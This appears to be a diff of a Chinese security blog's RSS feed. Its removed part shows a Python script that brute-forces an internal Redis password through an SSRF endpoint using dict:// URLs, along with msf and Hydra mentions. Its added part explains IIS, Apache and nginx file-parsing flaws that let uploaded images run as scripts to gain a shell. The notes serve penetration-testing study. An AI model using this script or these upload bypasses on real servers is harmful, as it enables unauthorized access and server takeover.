punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;redis-有密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redis-有密码&#34;&gt;#&lt;/a&gt; redis 有密码&lt;/h1&gt;
-&lt;h4 id=&#34;msf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf&#34;&gt;#&lt;/a&gt; msf&lt;/h4&gt;
-&lt;p&gt;直接就是使用 msf  的 redis_login 模块&lt;/p&gt;
-&lt;h4 id=&#34;hydra爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hydra爆破&#34;&gt;#&lt;/a&gt; hydra 爆破&lt;/h4&gt;
-&lt;h4 id=&#34;redis-弱口令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redis-弱口令&#34;&gt;#&lt;/a&gt; Redis 弱口令&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;dict://serverip:port/命令:参数
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;通过两次响应结果，可以确定 Redis 的密码为 123123，可以实现脚本爆破&lt;/p&gt;
-&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;parse &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://xx.xx.xx.xx:8000/ssrf.php?url=&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;param &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;dict://127.0.0.1:6788/auth:&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;r&#39;d:\\test\\top100.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        passwd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        all_url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; url &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; param &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; passwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# print(all_url)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        request &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Request&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;all_url&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;urlopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# print(response)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;+OK\\r\\n+OK\\r\\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;redis passwd: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+            <pubDate>Sat, 30 Nov 2024 21:48:44 +0800</pubDate>
+            <description><![CDATA[ &lt;h4 id=&#34;lls-60&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lls-60&#34;&gt;#&lt;/a&gt; lls 6.0&lt;/h4&gt;
+&lt;h5 id=&#34;目录解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录解析&#34;&gt;#&lt;/a&gt; 目录解析&lt;/h5&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;在 IIS5.x/6.0 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;文件解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件解析&#34;&gt;#&lt;/a&gt; 文件解析&lt;/h5&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;在 IIS5.x/6.0 中,分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;lls-70&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lls-70&#34;&gt;#&lt;/a&gt; lls 7.0&lt;/h4&gt;
+&lt;p&gt;IIS7.0 中，在默认 Fast-CGI 开启状况下 test.jpg/x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg 将会被服务器当成 php 文件执行.&lt;/p&gt;
+&lt;p&gt;cgi.fix_pathinfo，该值默认为 1，表示开启。当 php 遇到文件路径 /aaa.xxx/bbb.yyy/ccc.zzz  时，若 /aaa.xxx/bbb.yyy/ccc.zzz 不存在，则会去掉最后的 /ccc.zzz ，然后判断 /aaa.xxx/bbb.yyy 是否存在，若存在，则把 /aaa.xxx/bbb.yyy 当做文件  /aaa.xxx/bbb.yyy/ccc.zzz ，若   /aaa.xxx/bbb.yyy  仍不存在，则继续去掉  /bbb.yyy&lt;/p&gt;
+&lt;h4 id=&#34;漏洞原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞原理&#34;&gt;#&lt;/a&gt; &lt;strong&gt;漏洞原理&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如 test.php.owf.rar “.owf” 和”.rar” 这两种后缀是 apache 不可识别解析，apache 就会把 wooyun.php.owf.rar 解析成 php。&lt;/p&gt;
+&lt;h4 id=&#34;漏洞形式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞形式&#34;&gt;#&lt;/a&gt; &lt;strong&gt;漏洞形式&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.xxxx.xxx.com/test.php.xxx&#34;&gt;www.xxxx.xxx.com/test.php.xxx&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;配置问题导致漏洞&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。&lt;br /&gt;
+（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。&lt;/p&gt;
+&lt;h4 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h4&gt;
+&lt;p&gt;1、 由于 nginx.conf 的如下配置导致 nginx 把以’.php’结尾的文件交给 fastcgi 处理，为此可以构造&lt;a href=&#34;http://ip/uploadfiles/test.png/.php&#34;&gt; http://ip/uploadfiles/test.png/.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;2、但是 fastcgi 在处理’.php’文件时发现文件并不存在，这时 php.ini 配置文件中 cgi.fix_pathinfo=1 发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由 fastcgi 处理的文件就变成了’/test.png’。 最重要的一点是 php-fpm.conf 中的 security.limit_extensions 配置项限制了 fastcgi 解析文件的类型 (即指定什么类型的文件当做代码解析), 此项设置为空的时候才允许 fastcgi 将’.png’等文件当做代码解析。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;一般来讲，我们采用了 cgi 之后可以看到 它是逐层修复文件的，因为可以看到如果说他直接把 php 后缀的交给了服务器。但是最外层文件是不存在的，所以他会删掉，同时给出一个新的文件，但是可以看到我们的 jpg 是存在的就会解析我们的 jpg 作为 php&lt;/p&gt;
+ ]]></description>
         </item>
     </channel>
 </rss>
